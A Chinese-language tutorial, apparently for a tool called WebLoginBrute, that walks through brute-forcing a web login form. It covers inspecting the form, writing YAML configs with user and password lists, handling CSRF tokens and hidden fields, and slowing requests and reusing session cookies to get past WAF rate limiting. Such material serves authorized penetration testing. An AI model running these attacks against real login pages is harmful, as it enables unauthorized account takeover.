# 实战教程

本教程将通过一个完整的实战案例，指导您如何分析目标、配置 WebLoginBrute 并成功执行一次登录爆破。

## 场景设定

我们的目标是一个模拟的登录页面。这个页面具有以下特点，这也是在真实世界中非常常见的设计：

1.  它受 **CSRF (跨站请求伪造)** 保护，意味着每次提交表单都需要一个动态生成的、唯一的 `csrf_token`。
2.  除了用户名和密码，它还需要一个**隐藏的表单字段** `login_type`，其值必须为 `standard`。

不正确处理以上任何一点，都会导致登录失败。

## 步骤 1: 侦察目标

在运行工具之前，第一步永远是手动分析。

1.  用浏览器打开目标登录页面。
2.  按 F12 打开开发者工具，选择 "Elements" (元素) 或 "Inspector" (检查器) 标签页。
3.  找到 `<form>` 标签，并分析其内容。

假设我们看到了以下 HTML 代码：
```html
<form action="/auth/login" method="POST">
    <input type="text" name="username_field">
    <input type="password" name="password_field">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6a1b2c3d4e5f6">
    <input type="hidden" name="login_type" value="standard">
    <button type="submit">Log In</button>
</form>
```

从这段代码中，我们可以获得所有必需的信息：
-   **提交 URL (Action)**: `/auth/login`。如果表单的 `action` 属性为空，则提交 URL 通常就是当前页面的 URL。
-   **CSRF Token 字段名**: `csrf_token`。
-   **额外字段**: 需要一个名为 `login_type`，值为 `standard` 的字段。

## 步骤 2: 初次尝试 (并分析失败)

现在，让我们创建一个基础的 `config.yaml`，故意忽略掉 CSRF 和额外字段，看看会发生什么。

**`config.yaml`:**
```yaml
url: "https://your-target.com/login"
action: "https://your-target.com/auth/login"
users: "users.txt"
passwords: "passwords.txt"
threads: 5
```

**运行:**
```bash
webloginbrute --config config.yaml --verbose
```

**预期结果**: 所有尝试都会失败。在 `--verbose` 输出中，你可能会看到服务器返回了错误（如 403 Forbidden 或 419 Page Expired），或者被重定向回登录页，提示 "无效的 CSRF Token"。这验证了我们的侦察结果：CSRF 保护是有效的。

## 步骤 3: 修正配置

现在，我们将侦察到的所有信息都添加到 `config.yaml` 中。

**`config.yaml` (修正后):**
```yaml
url: "https://your-target.com/login"
action: "https://your-target.com/auth/login"
users: "users.txt"
passwords: "passwords.txt"
threads: 5

# 从侦察中添加的关键参数
csrf: "csrf_token"
login_field: "login_type"
login_value: "standard"
```

## 步骤 4: 成功爆破

使用修正后的配置再次运行工具。

**运行:**
```bash
webloginbrute --config config.yaml
```

**预期结果**: WebLoginBrute 现在会在每次尝试前，自动从登录页面获取最新的 `csrf_token`，并将其与 `login_type` 字段一同提交。如果你的字典中存在正确的凭证，这次你应该能看到登录成功的提示。

## 高级策略

### 应对速率限制 (WAF)
如果在爆破过程中，你开始收到大量连接错误，或者所有尝试突然开始失败，这很可能是因为你的 IP 被 WAF (Web 应用防火墙) 限速或封禁了。

**解决方案**: 调整配置，降低请求速率。
```yaml
# config.yaml
threads: 3          # 减少并发
aggressive: 2       # 提高对抗级别，增加请求间的随机延迟
timeout: 45         # 适当增加超时以应对服务器慢响应
```
然后使用 `--resume` 参数继续任务。

### 使用预设 Cookie
某些网站要求在登录前必须有一个有效的会话 Cookie。你可以先用浏览器访问一次网站，然后将浏览器中的 Cookie 导出为 Netscape 格式的 `cookies.txt` 文件。

**解决方案**: 使用 `--cookie` 参数加载该文件。
```bash
webloginbrute --config config.yaml --cookie /path/to/cookies.txt
```
程序会在所有请求中带上这些 Cookie。